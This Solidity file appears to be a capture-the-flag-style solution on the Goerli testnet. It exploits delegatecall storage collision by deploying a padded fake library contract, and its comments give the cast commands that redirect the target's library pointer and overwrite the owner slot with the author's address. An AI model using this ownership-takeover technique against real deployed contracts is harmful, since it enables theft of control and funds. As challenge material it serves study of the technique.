// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Need to set up my own library contract, stuff the first memory slots, 
// Then call it so it resets the owner memory slot to be mine.
// TO call it i push in its address into the first memory slot that is overwriting useing the bad librarys, 
// then it will call my bad contract from there as the memory has been corrupted

contract SpecialLibraryContract {
  address public fillerAddresSlot0;
  address public fillerAddresSlot1;
  // Pad first 2 slots so owner aligns
  uint public storedTime;
  // We will feed our desired owner in with this
  function setTime(uint256 _time) public {
    storedTime = _time;
  }
}

// Deployed address 0x402698970C6b50AcC952BD9A730863410a37163c
// After deploy just did switch from command line w/ cast 
// Load the newly deployed contract to storage slot 0

// cast send --rpc-url $GOERLI_RPC_URL 
//           --private-key $PRIVATE-KEY
//           0xeC26b6e2DcEF7c9d6434737312e0fD1eDE8BC6eb "setFirstTime(uint256)"
//           '0x402698970C6b50AcC952BD9A730863410a37163c' 

// Same command, swap out for my EOA address to be owner as now our special library will
// take the delegate call and put our address in slot 2(0 based) (also add gas limit as first
// try failed b/c not enough)

// cast send --rpc-url $GOERLI_RPC_URL 
//           --private-key $PRIVATE-KEY
//           --gas-limit 9500000
//           0xeC26b6e2DcEF7c9d6434737312e0fD1eDE8BC6eb "setFirstTime(uint256)"
//           '0x359bfB5160946a55f03c080c2DC6975C8F970d5C' 

// Can verify w/:
// cast storage --rpc-url $GOERLI_RPC_URL 0xeC26b6e2DcEF7c9d6434737312e0fD1eDE8BC6eb 2
// We ill get our address: 0x359bfB5160946a55f03c080c2DC6975C8F970d5C